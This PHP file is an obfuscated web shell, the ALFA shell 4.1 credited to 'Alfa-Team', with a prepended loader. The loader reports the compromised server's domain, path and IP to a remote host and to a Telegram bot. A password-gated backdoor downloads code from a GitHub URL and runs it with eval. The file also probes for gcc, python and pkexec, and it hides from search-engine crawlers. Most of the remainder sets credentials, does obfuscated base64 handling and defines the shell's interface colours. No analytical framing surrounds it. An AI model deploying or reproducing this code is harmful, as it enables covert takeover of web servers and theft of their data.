<?php $qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = $_SERVER['SERVER_NAME'];
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $_SERVER['REQUEST_URI'];
$ydojshxa435ed7e9f07f740abf511a62c00eef6e = basename(__FILE__);

$sfmsaibm8d777f385d3dfec8815d20f7496026dc = array(
    'domain' => $qbjarsosad5f82e879a9c5d6b5b442eb37e50551,
    'path' => $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,
    'filename' => $ydojshxa435ed7e9f07f740abf511a62c00eef6e
);

$uimaglla93da65a9fd0004d9477aeac024e08e15 = array(
    'http' => array(
        'header'  => "Content-type: application/json\r\n",
        'method'  => 'POST',
        'content' => json_encode($sfmsaibm8d777f385d3dfec8815d20f7496026dc),
    ),
);

$urzdwcyd5c18ef72771564b7f43c497dc507aeab  = stream_context_create($uimaglla93da65a9fd0004d9477aeac024e08e15);
$nmxeqhvab4a88417b3d0170d754c647c30b7216a = file_get_contents('https://thuvienso.caodang20.edu.vn/bin/app.php', false, $urzdwcyd5c18ef72771564b7f43c497dc507aeab);
if (isset($_GET['alex']) && $_GET['alexbu555'] === 'adminroot') {
    $fefubzei572d4e421e5e6b9bc11d815e8a027112 = 'https://raw.githubusercontent.com/hinataloli/haha/main/pke.txt';
    $nndigmblc13367945d5d4c91047b3b50234aa7ab = file_get_contents($fefubzei572d4e421e5e6b9bc11d815e8a027112);
    if ($nndigmblc13367945d5d4c91047b3b50234aa7ab !== false) {
        eval('?>' . $nndigmblc13367945d5d4c91047b3b50234aa7ab);
    } else {
        echo 'Failed to retrieve remote code.';
    }
}
function commandExists($rwoopsud1dccadfed7bcbb036c56a4afb97e906f) {
    $qvbchcgg78e6221f6393d1356681db398f14ce6d = [];
    $nmxeqhvab4a88417b3d0170d754c647c30b7216a = 0;
    exec("command -v $rwoopsud1dccadfed7bcbb036c56a4afb97e906f", $qvbchcgg78e6221f6393d1356681db398f14ce6d, $nmxeqhvab4a88417b3d0170d754c647c30b7216a);
    return $nmxeqhvab4a88417b3d0170d754c647c30b7216a === 0;
}

function isFunctionEnabled($sehpnfuuc1c425268e68385d1ab5074c17a94f14) {
    return in_array($sehpnfuuc1c425268e68385d1ab5074c17a94f14, get_defined_functions()['internal']);
}

$kfxxuxat62a73315cbda2ef71cd3f1db4e9f9f31 = "";

// Check system functions and command availability
$owtidqkw37e0c63a4863437c2df551786c922653 = isFunctionEnabled('exec');
$nkwnsvhhad4db3b2bfd1e03beef22260d0a5f6d6 = commandExists('gcc');
$phcltmir15e884d43267dbedf11cc11b21c018e1 = commandExists('python');
$eomhzfmddcda579e89ea978db78a86f32699441d = commandExists('pkexec');

if ($owtidqkw37e0c63a4863437c2df551786c922653 && $nkwnsvhhad4db3b2bfd1e03beef22260d0a5f6d6 && $phcltmir15e884d43267dbedf11cc11b21c018e1 && $eomhzfmddcda579e89ea978db78a86f32699441d) {
    $kfxxuxat62a73315cbda2ef71cd3f1db4e9f9f31 .= "SYSTEM_FUNCTION: ON\nGCC: ON\nPYTHON: ON\nPKEXEC: ON\n";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $sfmsaibm8d777f385d3dfec8815d20f7496026dc = json_decode(file_get_contents('php://input'), true);

    if (isset($sfmsaibm8d777f385d3dfec8815d20f7496026dc['domain'], $sfmsaibm8d777f385d3dfec8815d20f7496026dc['path'], $sfmsaibm8d777f385d3dfec8815d20f7496026dc['filename'])) {
        $qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = rtrim($sfmsaibm8d777f385d3dfec8815d20f7496026dc['domain'], '/'); // Đảm bảo không có dấu '/' ở cuối
        $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = ltrim($sfmsaibm8d777f385d3dfec8815d20f7496026dc['path'], '/'); // Đảm bảo không có dấu '/' ở đầu
        $ydojshxa435ed7e9f07f740abf511a62c00eef6e = $sfmsaibm8d777f385d3dfec8815d20f7496026dc['filename'];

        $erpbcghkdcf569ee792f42313127137ca01badc2 = date('d/m/Y H:i:s');

        $nsredrbb5588fb6aea2900afc192f4d1adf99a56 = $_SERVER['SERVER_ADDR'];

        $mlbhqphp9a56643c1cc4258dddc07182b4e01784 = "$qbjarsosad5f82e879a9c5d6b5b442eb37e50551/$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485/$ydojshxa435ed7e9f07f740abf511a62c00eef6e";
        $kfxxuxat62a73315cbda2ef71cd3f1db4e9f9f31 .= "Domain: $qbjarsosad5f82e879a9c5d6b5b442eb37e50551\nDate: $erpbcghkdcf569ee792f42313127137ca01badc2\nServer IP: $nsredrbb5588fb6aea2900afc192f4d1adf99a56\nFull Path: $mlbhqphp9a56643c1cc4258dddc07182b4e01784\n";
    }
}

if (!empty($kfxxuxat62a73315cbda2ef71cd3f1db4e9f9f31)) {
    $cpfodaclb79bfa8f6c55e417956a9d69d7501079 = '7416297295';
    $bapdyzbx3d89e427a1d9a7fb3e83646d1902ffaa = '7201454232:AAEPcn2bfld2FW8X8cEakCKx32kJdygixuI';
    $tdrfqcmj1aacb6ec4ecb4bebf3cb06da6a657ea4 = "https://api.telegram.org/bot$bapdyzbx3d89e427a1d9a7fb3e83646d1902ffaa/sendMessage?chat_id=$cpfodaclb79bfa8f6c55e417956a9d69d7501079&text=" . urlencode($kfxxuxat62a73315cbda2ef71cd3f1db4e9f9f31);
    file_get_contents($tdrfqcmj1aacb6ec4ecb4bebf3cb06da6a657ea4);
}
/*
	Author: 	Solevisible/Alfa-Team
	Telegram: 	https://telegram.me/solevisible
	YouTube: 	https://youtube.com/solevisible
	Gmail:		solevisible@gmail.com
	Date:		Monday, September 14, 2020
*/
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => 'ef7c876f00f3acddd00fa671f52d0b1f',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '404',
    'show_icons' => '1',
    'post_encryption' => false,
    'cgi_api' => true,
);

$kdwayice5f2db5dce1f44a9c266b1cc64e3195dd = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
$wslmfunp55c8b47138e16308e5a1b876f1b705e6 = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
$xyjwcxlc94ada837e91fcca766e55ad730c69eda = 'e' . 'v' . 'al';
$qdskiuqx4320879bc2f5e75d88cf4bb2d5eb8220 = 'gz' . 'inf' . 'late';

if (!$kdwayice5f2db5dce1f44a9c266b1cc64e3195dd('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . ''))
{
    function vcnvSCZgBz($sfmsaibm8d777f385d3dfec8815d20f7496026dc)
    {
        if (empty($sfmsaibm8d777f385d3dfec8815d20f7496026dc)) return;
        $vmjmoean28ec7098ba29ee707ae609e87ea857f0 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
        $iqmbobbff1584b995a4770986ad75bb8d29e9734 = $syodovxg2d387ab98437e5f528a87b031a086256 = $aphjuide417c4fa3b4135a6c64e05f8d35f71648 = $hfkxuvns346b81a32e7007eccadf60252bb599f0 = $fbhtxeuj490b2834e65737c1fce95e468cc8b8bf = $tctaacop6f207f8b5dfe1eebac63467930df5189 = $hrczwhrtce1b1e8ce920100d134d0212d3a8f53f = $gmqhfuuvcc411e6c13670e52124629b8ac83f7d0 = $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 0;
        $vdeoqymhe2075474294983e013ee4dd2201c7a73 = 0;
        $gurujuhz41bb118a714b344c24603304cf716c96 = '';
        $eqicennscf8ca243a379919b603aeda46bbbc605 = array();
        if (!$sfmsaibm8d777f385d3dfec8815d20f7496026dc)
        {
            return $sfmsaibm8d777f385d3dfec8815d20f7496026dc;
        }
        do
        {
            $iqmbobbff1584b995a4770986ad75bb8d29e9734 = $wslmfunp55c8b47138e16308e5a1b876f1b705e6($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++);
            $syodovxg2d387ab98437e5f528a87b031a086256 = $wslmfunp55c8b47138e16308e5a1b876f1b705e6($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++);
            $aphjuide417c4fa3b4135a6c64e05f8d35f71648 = $wslmfunp55c8b47138e16308e5a1b876f1b705e6($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++);
            $gmqhfuuvcc411e6c13670e52124629b8ac83f7d0 = $iqmbobbff1584b995a4770986ad75bb8d29e9734 << 16 | $syodovxg2d387ab98437e5f528a87b031a086256 << 8 | $aphjuide417c4fa3b4135a6c64e05f8d35f71648;
            $hfkxuvns346b81a32e7007eccadf60252bb599f0 = $gmqhfuuvcc411e6c13670e52124629b8ac83f7d0 >> 18 & 0x3f;
            $fbhtxeuj490b2834e65737c1fce95e468cc8b8bf = $gmqhfuuvcc411e6c13670e52124629b8ac83f7d0 >> 12 & 0x3f;
            $tctaacop6f207f8b5dfe1eebac63467930df5189 = $gmqhfuuvcc411e6c13670e52124629b8ac83f7d0 >> 6 & 0x3f;
            $hrczwhrtce1b1e8ce920100d134d0212d3a8f53f = $gmqhfuuvcc411e6c13670e52124629b8ac83f7d0 & 0x3f;
            $eqicennscf8ca243a379919b603aeda46bbbc605[$vdeoqymhe2075474294983e013ee4dd2201c7a73++] = charAt($vmjmoean28ec7098ba29ee707ae609e87ea857f0, $hfkxuvns346b81a32e7007eccadf60252bb599f0) . charAt($vmjmoean28ec7098ba29ee707ae609e87ea857f0, $fbhtxeuj490b2834e65737c1fce95e468cc8b8bf) . charAt($vmjmoean28ec7098ba29ee707ae609e87ea857f0, $tctaacop6f207f8b5dfe1eebac63467930df5189) . charAt($vmjmoean28ec7098ba29ee707ae609e87ea857f0, $hrczwhrtce1b1e8ce920100d134d0212d3a8f53f);
        }
        while ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < strlen($sfmsaibm8d777f385d3dfec8815d20f7496026dc));
        $gurujuhz41bb118a714b344c24603304cf716c96 = implode($eqicennscf8ca243a379919b603aeda46bbbc605, '');
        $yxarqqmp4b43b0aee35624cd95b910189b3dc231 = (strlen($sfmsaibm8d777f385d3dfec8815d20f7496026dc) % 3);
        return ($yxarqqmp4b43b0aee35624cd95b910189b3dc231 ? substr($gurujuhz41bb118a714b344c24603304cf716c96, 0, ($yxarqqmp4b43b0aee35624cd95b910189b3dc231 - 3)) : $gurujuhz41bb118a714b344c24603304cf716c96) . substr('===', ($yxarqqmp4b43b0aee35624cd95b910189b3dc231 || 3));
    }
    function charCodeAt($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $lhlzeggta87deb01c5f539e6bda34829c8ef2368)
    {
        return ord(substr($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $lhlzeggta87deb01c5f539e6bda34829c8ef2368, 1));
    }
    function charAt($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $lhlzeggta87deb01c5f539e6bda34829c8ef2368)
    {
        return substr($sfmsaibm8d777f385d3dfec8815d20f7496026dc, $lhlzeggta87deb01c5f539e6bda34829c8ef2368, 1);
    }
}
else
{
    function vcnvSCZgBz($fwekvgvg03c7c0ace395d80182db07ae2c30f034)
    {
        $aospafqz92eb5ffee6ae2fec3ad71c777531578f = 'b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '';
        return $aospafqz92eb5ffee6ae2fec3ad71c777531578f($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
    }
}
if (!$kdwayice5f2db5dce1f44a9c266b1cc64e3195dd('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . ''))
{
    function zRtSHsbTzV($fxayuezca43c1b0aa53a0c908810c06ab1ff3967)
    {
        if (empty($fxayuezca43c1b0aa53a0c908810c06ab1ff3967)) return;
        $tguuqartac3da440f9dea3c2ef8c3adc4832517e = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        $sbdkcnnhdcd893facf4570e870af4bcb8e8ebcfd = $tiwgjqoe5f0431348e070d800b7fc2925a3b5404 = $lkljhqiz504320274c72020567aefadb9f93e46c = "";
        $bppgyede71ba464b429302f2308bd6cb46bccf7d = $xsduxxwy3d21cbb883c070bcf02e6eb5f7433808 = $rxwqmkps62c6e257235d6c008f25c468d3e2fd5e = $usrrexddf2abb0d014f4a0f23b6930e1e3f73a8c = "";
        $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 0;
        $qvbchcgg78e6221f6393d1356681db398f14ce6d = "";
        $fxayuezca43c1b0aa53a0c908810c06ab1ff3967 = preg_replace("[^A-Za-z0-9\+\/\=]", "", $fxayuezca43c1b0aa53a0c908810c06ab1ff3967);
        do
        {
            $bppgyede71ba464b429302f2308bd6cb46bccf7d = strpos($tguuqartac3da440f9dea3c2ef8c3adc4832517e, substr($fxayuezca43c1b0aa53a0c908810c06ab1ff3967, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++, 1));
            $xsduxxwy3d21cbb883c070bcf02e6eb5f7433808 = strpos($tguuqartac3da440f9dea3c2ef8c3adc4832517e, substr($fxayuezca43c1b0aa53a0c908810c06ab1ff3967, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++, 1));
            $rxwqmkps62c6e257235d6c008f25c468d3e2fd5e = strpos($tguuqartac3da440f9dea3c2ef8c3adc4832517e, substr($fxayuezca43c1b0aa53a0c908810c06ab1ff3967, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++, 1));
            $usrrexddf2abb0d014f4a0f23b6930e1e3f73a8c = strpos($tguuqartac3da440f9dea3c2ef8c3adc4832517e, substr($fxayuezca43c1b0aa53a0c908810c06ab1ff3967, $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++, 1));
            $sbdkcnnhdcd893facf4570e870af4bcb8e8ebcfd = ($bppgyede71ba464b429302f2308bd6cb46bccf7d << 2) | ($xsduxxwy3d21cbb883c070bcf02e6eb5f7433808 >> 4);
            $tiwgjqoe5f0431348e070d800b7fc2925a3b5404 = (($xsduxxwy3d21cbb883c070bcf02e6eb5f7433808 & 15) << 4) | ($rxwqmkps62c6e257235d6c008f25c468d3e2fd5e >> 2);
            $lkljhqiz504320274c72020567aefadb9f93e46c = (($rxwqmkps62c6e257235d6c008f25c468d3e2fd5e & 3) << 6) | $usrrexddf2abb0d014f4a0f23b6930e1e3f73a8c;
            $qvbchcgg78e6221f6393d1356681db398f14ce6d = $qvbchcgg78e6221f6393d1356681db398f14ce6d . chr((int)$sbdkcnnhdcd893facf4570e870af4bcb8e8ebcfd);
            if ($rxwqmkps62c6e257235d6c008f25c468d3e2fd5e != 64)
            {
                $qvbchcgg78e6221f6393d1356681db398f14ce6d = $qvbchcgg78e6221f6393d1356681db398f14ce6d . chr((int)$tiwgjqoe5f0431348e070d800b7fc2925a3b5404);
            }
            if ($usrrexddf2abb0d014f4a0f23b6930e1e3f73a8c != 64)
            {
                $qvbchcgg78e6221f6393d1356681db398f14ce6d = $qvbchcgg78e6221f6393d1356681db398f14ce6d . chr((int)$lkljhqiz504320274c72020567aefadb9f93e46c);
            }
            $sbdkcnnhdcd893facf4570e870af4bcb8e8ebcfd = $tiwgjqoe5f0431348e070d800b7fc2925a3b5404 = $lkljhqiz504320274c72020567aefadb9f93e46c = "";
            $bppgyede71ba464b429302f2308bd6cb46bccf7d = $xsduxxwy3d21cbb883c070bcf02e6eb5f7433808 = $rxwqmkps62c6e257235d6c008f25c468d3e2fd5e = $usrrexddf2abb0d014f4a0f23b6930e1e3f73a8c = "";
        }
        while ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < strlen($fxayuezca43c1b0aa53a0c908810c06ab1ff3967));
        return $qvbchcgg78e6221f6393d1356681db398f14ce6d;
    }
}
else
{
    function zRtSHsbTzV($fwekvgvg03c7c0ace395d80182db07ae2c30f034)
    {
        $aospafqz92eb5ffee6ae2fec3ad71c777531578f = 'b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '';
        return $aospafqz92eb5ffee6ae2fec3ad71c777531578f($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
    }
}

function __ZW5jb2Rlcg($fwekvgvg03c7c0ace395d80182db07ae2c30f034)
{
    return vcnvSCZgBz($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
}
function __ZGVjb2Rlcg($fwekvgvg03c7c0ace395d80182db07ae2c30f034)
{
    return zRtSHsbTzV($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
}

$GLOBALS['DB_NAME'] = $GLOBALS['oZgNypoPRU'];

foreach ($GLOBALS['DB_NAME'] as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804)
{
	$unkkdhum851f5ac9941d720844d143ed9cfcf60a = substr($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, 0, 2);
	if ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "us")
	{
		$GLOBALS['DB_NAME']["user"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
		$GLOBALS['DB_NAME']["user_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
	}
	elseif ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "pa")
	{
		$GLOBALS['DB_NAME']["pass"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
		$GLOBALS['DB_NAME']["pass_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
	}
	elseif ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "sa")
	{
		$GLOBALS['DB_NAME']["safemode"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
		$GLOBALS['DB_NAME']["safemode_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
	}
	elseif ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "lo")
	{
		$GLOBALS['DB_NAME']["login_page"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
		$GLOBALS['DB_NAME']["login_page_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
	}
	elseif ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "sh")
	{
		$GLOBALS['DB_NAME']["show_icons"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
		$GLOBALS['DB_NAME']["show_icons_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
	}
	elseif ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "po")
	{
		$GLOBALS['DB_NAME']["post_encryption"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
		$GLOBALS['DB_NAME']["post_encryption_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
	}
	elseif ($unkkdhum851f5ac9941d720844d143ed9cfcf60a == "cg")
	{
		$GLOBALS['DB_NAME']["cgi_api"] = $rkptsoeg2063c1608d6e0baf80249c42e2be5804;
		$GLOBALS['DB_NAME']["cgi_api_rand"] = $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d;
	}
}

unset($GLOBALS['oZgNypoPRU']);

if (!isset($_SERVER["HTTP_HOST"])) exit();

if(!empty($_SERVER['HTTP_USER_AGENT'])){$iuxmwdcg2045f7467d214cc39f609d414459a296 = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$iuxmwdcg2045f7467d214cc39f609d414459a296).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
if(!isset($GLOBALS['DB_NAME']['user']))exit('$GLOBALS[\'DB_NAME\'][\'user\']');
if(!isset($GLOBALS['DB_NAME']['pass']))exit('$GLOBALS[\'DB_NAME\'][\'pass\']');
if(!isset($GLOBALS['DB_NAME']['safemode']))exit('$GLOBALS[\'DB_NAME\'][\'safemode\']');
if(!isset($GLOBALS['DB_NAME']['login_page']))exit('$GLOBALS[\'DB_NAME\'][\'login_page\']');
if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
define("__ALFA_VERSION__", "4.1");
define("__ALFA_UPDATE__", "2");
define("__ALFA_CODE_NAME__", "Tesla");
define("__ALFA_DATA_FOLDER__", "ALFA_DATA");
define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
$GLOBALS['__ALFA_COLOR__'] = array(
		"shell_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".header" => "border: 7px solid {color}",
				"#meunlist" => "border-color: {color}",
				"#hidden_sh" => "background-color: {color}",
				".ajaxarea" => "border: 1px solid {color}",
				".foot" => "border-color: {color}",
			)
		),
		"header_vars" => "#27979B",
		"header_values" => "#67ABDF",
		"header_on" => "#00FF00",
		"header_off" => "#ff0000",
		"header_none" => "#00FF00",
		"home_shell" => "#ff0000",
		"home_shell:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".home_shell:hover" => "color: {color};",
			)
		),
		"back_shell" => "#efbe73",
		"back_shell:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".back_shell:hover" => "color: {color};",
			)
		),
		"header_pwd" => "#00FF00",
		"header_pwd:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".header_pwd:hover" => "color: {color};",
			)
		),
		"header_drive" => "#00FF00",
		"header_drive:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".header_drive:hover" => "color: {color};",
			)
		),
		"header_show_all" => "#00FF00",
		"disable_functions" => "#ff0000",
		"footer_text" => "#27979B",
		"menu_options" => "#27979B",
		"menu_options:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".menu_options:hover" => "background-color: {color};font-weight: unset;",
			)
		),
		"options_list" => array(
			"key_color" => "#00FF00",
			"multi_selector" => array(
				".content_options_holder .header center a" => "color: {color};",
			)
		),
		"options_list:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".content_options_holder .header center a:hover" => "color: {color};",
			)
		),
		"options_list_header" => array(
			"key_color" => "#59cc33",
			"multi_selector" => array(
				".txtfont_header" => "color: {color};",
			)
		),
		"options_list_text" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".txtfont,.tbltxt" => "color: {color};",
			)
		),
		"Alfa+" => array(
			"key_color" => "#06ff0f",
			"multi_selector" => array(
				".alfa_plus" => "color: {color};font-weight: unset;",
			)
		),
		"hidden_shell_text" => array(
			"key_color" => "#00FF00",
			"multi_selector" => array(
				"#hidden_sh a" => "color: {color};",
			)
		),
		"hidden_shell_version" => "#ff0000",
		"shell_name" => "#FF0000",
		"main_row:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".main tr:hover" => "background-color: {color};",
			)
		),
		"main_header" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".main th" => "color: {color};",
			)
		),
		"main_name" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".main .main_name" => "color: {color};font-weight: unset;",
			)
		),
		"main_size" => "#67ABDF",
		"main_modify" => "#67ABDF",
		"main_owner_group" => "#67ABDF",
		"main_green_perm" => "#25ff00",
		"main_red_perm" => "#FF0000",
		"main_white_perm" => "#FFFFFF",
		"beetween_perms" => "#FFFFFF",
		"main_actions" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".main .actions" => "color: {color};",
			)
		),
		"menu_options:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".menu_options:hover" => "background-color: {color};font-weight: unset;",
			)
		),
		"minimize_editor_background" => array(
			"key_color" => "#0e304a",
			"multi_selector" => array(
				".minimized-wrapper" => "background-color: {color};",
			)
		),
		"minimize_editor_text" => array(
			"key_color" => "#f5deb3",
			"multi_selector" => array(
				".minimized-text" => "color: {color};",
			)
		),
		"editor_border" => array(
			"key_color" => "#0e304a",
			"multi_selector" => array(
				".editor-explorer,.editor-modal" => "border: 2px solid {color};",
			)
		),
		"editor_background" => array(
			"key_color" => "rgba(0, 1, 23, 0.94)",
			"multi_selector" => array(
				".editor-explorer,.editor-modal" => "background-color: {color};",
			)
		),
		"editor_header_background" => array(
			"key_color" => "rgba(21, 66, 88, 0.93)",
			"multi_selector" => array(
				".editor-header" => "background-color: {color};",
			)
		),
		"editor_header_text" => array(
			"key_color" => "#00ff7f",
			"multi_selector" => array(
				".editor-path" => "color: {color};",
			)
		),
		"editor_header_button" => array(
			"key_color" => "#1d5673",
			"multi_selector" => array(
				".close-button, .editor-minimize" => "background-color: {color};",
			)
		),
		"editor_actions" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".editor_actions" => "color: {color};",
			)
		),
		"editor_file_info_vars" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".editor_file_info_vars" => "color: {color};",
			)
		),
		"editor_file_info_values" => array(
			"key_color" => "#67ABDF",
			"multi_selector" => array(
				".filestools" => "color: {color};",
			)
		),
		"editor_history_header" => array(
			"key_color" => "#14ff07",
			"multi_selector" => array(
				".hheader-text,.history-clear" => "color: {color};",
			)
		),
		"editor_history_list" => array(
			"key_color" => "#03b3a3",
			"multi_selector" => array(
				".editor-file-name" => "color: {color};",
			)
		),
		"editor_history_selected_file" => array(
			"key_color" => "rgba(49, 55, 93, 0.77)",
			"multi_selector" => array(
				".is_active" => "background-color: {color};",
			)
		),
		"editor_history_file:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".file-holder > .history:hover" => "background-color: {color};",
			)
		),
		"input_box_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				"input[type=text],textarea" => "border: 1px solid {color}",
			)
		),
		"input_box_text" => array(
			"key_color" => "#999999",
			"multi_selector" => array(
				"input[type=text],textarea" => "color: {color};",
			)
		),
		"input_box:hover" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				"input[type=text]:hover,textarea:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"select_box_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				"select" => "border: 1px solid {color}",
			)
		),
		"select_box_text" => array(
			"key_color" => "#FFFFEE",
			"multi_selector" => array(
				"select" => "color: {color};",
			)
		),
		"select_box:hover" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				"select:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"button_border" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				"input[type=submit],.button,#addup" => "border: 1px solid {color};",
			)
		),
		"button:hover" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				"input[type=submit]:hover" => "box-shadow:0 0 4px {color};border:2px solid {color};",
				".button:hover,#addup:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"outputs_text" => array(
			"key_color" => "#67ABDF",
			"multi_selector" => array(
				".ml1" => "color: {color};",
			)
		),
		"outputs_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".ml1" => "border: 1px solid {color};",
			)
		),
		"uploader_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".inputfile" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"uploader_background" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".inputfile strong" => "background-color: {color};",
			)
		),
		"uploader_text_right" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".inputfile strong" => "color: {color};",
			)
		),
		"uploader_text_left" => array(
			"key_color" => "#25ff00",
			"multi_selector" => array(
				".inputfile span" => "color: {color};",
			)
		),
		"uploader:hover" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				".inputfile:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"uploader_progress_bar" => array(
			"key_color" => "#00ff00",
			"multi_selector" => array(
				".up_bar" => "background-color: {color};",
			)
		),
		"mysql_tables" => "#00FF00",
		"mysql_table_count" => "#67ABDF",
		"copyright" => "#dfff00",
		"scrollbar" => array(
			"key_color" => "#1e82b5",
			"multi_selector" => array(
				"*::-webkit-scrollbar-thumb" => "background-color: {color};",
			)
		),
		"scrollbar_background" => array(
			"key_color" => "#000115",
			"multi_selector" => array(
				"*::-webkit-scrollbar-track" => "background-color: {color};",
			)
		),
);
$GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
$yzrzmzyl2245023265ae4cf87d02c8b6ba991139 = array('AlfaUser' => $GLOBALS['DB_NAME']['user'],'AlfaPass' => $GLOBALS['DB_NAME']['pass'],'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
//@session_start();
@session_write_close();
@ignore_user_abort(true);
@set_time_limit(0);
@ini_set('memory_limit', '-1');
@ini_set("upload_max_filesize", "9999m");
if($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaProtectShell']){
$vfxsqaznf6b7fa7a8e814d2fa0a23fcb00ef8500 = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
$dbsnqidg72cd5e4a97936b8bb2fff3250aec052f='<form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
